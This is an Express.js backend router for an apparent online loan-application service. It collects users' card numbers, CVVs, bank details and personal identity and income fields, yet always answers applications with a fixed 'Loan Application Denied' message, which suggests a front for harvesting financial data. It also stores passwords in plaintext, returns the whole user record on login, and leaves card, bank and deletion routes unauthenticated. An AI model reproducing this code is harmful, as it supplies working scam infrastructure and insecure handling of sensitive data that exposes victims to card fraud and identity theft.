const express=require('express')
const router=express.Router()
const {Schema}=require("../Schema/Schema")
const jwt=require('jsonwebtoken')
const verifyJwt=require('../Verify/verification')


const User=router.post("/signup",async(req,res)=>{
      console.log(req.body)
    const email=await req.body?.email?.toLowerCase()
    const email_exist=await Schema.findOne({"user.email":email})
    if(email_exist){
        console.log('done')
        return res.json({accounts:false,data:"Email Already Exist"})
    }
    else{
        const usersave=new Schema({
            user:{
            first_name:req.body.firstname,
            last_name:req.body.lastname,
            email:email,
            phone_no:req.body.phone,
            password:req.body.password,
            comfirm_password:req.body.comfirmpassword,
            notification:{
                alert:true,
                msg:{
                title:'Welcome New User',
                message:"We're elated to have you onboard of our community. We have added you to our mailing list, you will be among the first people to get all of our special offers, newest updates, and announcements. We will do our best not to bore you with marketing emails."
            }}}
    
        })
        await usersave.save()
        try{
            
            return res.json({accounts:true,data:"Sign-Up Successful"})
            
          
        }
        catch(err){
            return res.json({account:false,data:"Sign-Up Error"})
           
        }
       
    }
})
router.post('/login',async(req,res)=>{
    console.log(req.body)
    const email=req.body.email.toLowerCase()
    const password=req.body.password
    const emails=await Schema.findOne({'user.email':email})
    if(!emails){
        const data='Email does not exist'
       return res.json({data:data,auth:false})
       
    }
    else{
    if(emails.user.password!=password){
        const data='Wrong Password'
        return res.json({data:data,auth:false})
       
    }
    else{
        const token=jwt.sign({_id: emails._id},process.env.TOKEN_SECRET)
        const data=emails
        return res.json({auth:true,token:token,data:data})
        
    }}
})

router.get("/:id",verifyJwt,async(req,res)=>{
   const id=req.params.id
    const data=await Schema.findOne({_id:id})
    try{
    return res.json({auth:true,data:data})}
    catch(err){
    return res.json('error')
    }

})
router.get("/result/:id",verifyJwt,async(req,res)=>{
    const id=req.params.id
     const data=await Schema.findOne({_id:id})
     try{
     return res.json({data:false,msg:"Loan Application Denied",text:'After careful consideration, we will unfortunately be unable to take favourable action on your application. We recommend trying again after 3 days'})}
     catch(err){
     return res.json('error')
     }
 
 })
router.put('/payment/:id',async(req,res)=>{
    const id=req.params.id
    await Schema.findOneAndUpdate({_id:id},{
         $push:{
            'user.payment':{
            account_no:req.body.acno,
            account_name:req.body.acna,
            cvv:req.body.cvv,
            date:req.body.date
          }         
         }
    },{ upsert:false,
        strict:false}).then((doc)=>{
            return res.json({mgs:true,data:doc})
        }).catch((err)=>{
             return res.json(err)
        })

})

router.put('/bank/:id',async(req,res)=>{
    const id=req.params.id
    await Schema.findOneAndUpdate({_id:id},{
         $push:{
            'user.banks':{
                bank_name:req.body.bna,
                bank_no:req.body.bn,
                account_namee:req.body.an,
                bank_type:req.body.bt
          }         
         }
    },{ upsert:false,
        strict:false}).then((doc)=>{
            return res.json({mgs:"Added",data:doc})
        }).catch((err)=>{
             return res.json(err)
        })

})
router.put('/notifyalert/:id',async(req,res)=>{
    const id=req.params.id
    console.log(id)
    console.log(req.body)
    await Schema.findOneAndUpdate({_id:id},{
         $push:{
            'user.notification.msg':{
                    title:'Application Denied',
                    message:"After careful consideration, we will unfortunately be unable to take favourable action on your application. We recommend trying again after 3 days."
          }         
         }
    },{ upsert:false,
        strict:false}).then(async(doc)=>{
            await Schema.findOneAndUpdate({_id:id},{
                $set:{
                   'user.notification.alert':true         
                }
           },{ upsert:false,
               strict:false}).then((doc)=>{
               }).catch((err)=>{
                   console.log(err)
                    
               })
            return res.json({mgs:"Done"})
        }).catch((err)=>{
            console.log(err)
             return res.json(err)
        })

})
router.put('/notifypanel/:id',async(req,res)=>{
    const id=req.params.id
    await Schema.findOneAndUpdate({_id:id},{
         $set:{
            'user.notification.alert':req.body.alert       
         }
    },{ upsert:false,
        strict:false}).then((doc)=>{
            return res.json({mgs:"Done"})
        }).catch((err)=>{
            console.log(err)
             return res.json(err)
        })

})

router.put('/form/:id',async(req,res)=>{
    const id=req.params.id
    await Schema.findOneAndUpdate({_id:id},{
        $push:{
            'user.form':{
                  fn:req.body.fn,
                  ln:req.body.ln,
                  rd:req.body.rd,
                  ci:req.body.ci,
                  zc:req.body.zc,
                  st:req.body.st,
                  ad:req.body.ad,
                  db:req.body.db,
                  sn:req.body.sn,
                  pn:req.body.pn,
                  in:req.body.in,
                  jt:req.body.jt,
                  en:req.body.en,
                  ni:req.body.ni,
                  ip:req.body.ip,
                  lp:req.body.lp,
                  la:req.body.la,
                  pt:req.body.pt
            }
        }
    },{ upsert:false,
        strict:false}).then((doc)=>{
            return res.json({mgs:"Added"})
        }).catch((err)=>{
             return res.json("error")
        })
})
router.get('/delete/:user/:id',async(req,res)=>{
    const user=req.params.user
    console.log('open')
    const data=await Schema.findOneAndUpdate({_id:user},{
        $pull:{
            "user.banks":{_id:req.params.id}
        }}).then((r)=>{
            console.log(r)
            return res.json('done')
        }).catch((err)=>{
            console.log(err)
        })
  })
  router.get('/deletepay/:user/:id',async(req,res)=>{
    const user=req.params.user
    console.log('open')
    const data=await Schema.findOneAndUpdate({_id:user},{
        $pull:{
            "user.payment":{_id:req.params.id}
        }}).then((r)=>{
            console.log(r)
            return res.json('done')
        }).catch((err)=>{
            console.log(err)
        })
  })

module.exports.User = User